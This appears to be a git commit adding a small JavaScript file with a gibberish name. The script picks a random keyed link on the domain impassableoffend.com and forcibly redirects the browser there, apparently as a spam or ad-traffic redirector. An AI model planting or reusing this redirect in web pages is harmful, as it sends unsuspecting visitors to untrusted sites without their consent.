d3ed460671800ee68bd478303a230aab6c5f9434
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-09-04 14:57:19 +0700

    Create akeadssttgbng41.js

---
+++ akeadssttgbng41.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+
+'https://impassableoffend.com/v814e3yqtz?key=6451533ad619b387bfbe24dfad745310',
+'https://impassableoffend.com/v814e3yqtz?key=6451533ad619b387bfbe24dfad745310',
+'https://impassableoffend.com/v814e3yqtz?key=6451533ad619b387bfbe24dfad745310',
+'https://impassableoffend.com/v814e3yqtz?key=6451533ad619b387bfbe24dfad745310',
+'https://impassableoffend.com/rdrs776m?key=f9634f23d50ea22d81e04f0f832ae43b',
+'https://impassableoffend.com/rdrs776m?key=f9634f23d50ea22d81e04f0f832ae43b',
+'https://impassableoffend.com/rdrs776m?key=f9634f23d50ea22d81e04f0f832ae43b',
+'https://impassableoffend.com/rdrs776m?key=f9634f23d50ea22d81e04f0f832ae43b',
+'https://impassableoffend.com/cpvev1nj?key=d5c7343878687e73c517d3fc718bec2e',
+'https://impassableoffend.com/cpvev1nj?key=d5c7343878687e73c517d3fc718bec2e'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
